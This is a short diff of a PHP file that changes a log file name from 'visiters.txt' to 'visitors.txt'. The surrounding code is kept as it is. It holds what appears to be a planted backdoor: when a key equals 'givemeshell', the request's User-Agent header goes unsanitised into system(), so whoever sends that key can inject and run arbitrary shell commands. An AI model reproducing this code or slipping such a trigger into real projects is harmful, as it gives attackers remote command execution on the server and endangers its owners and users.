@@ -10,7 +10,7 @@
                 
                 if($key === "givemeshell"){
                         echo $_SERVER['HTTP_USER_AGENT'];                       
-                        system("echo ".$_SERVER['HTTP_USER_AGENT']." >> /tmp/visiters.txt");
+                        system("echo ".$_SERVER['HTTP_USER_AGENT']." >> /tmp/visitors.txt");
                 }
         }       
         
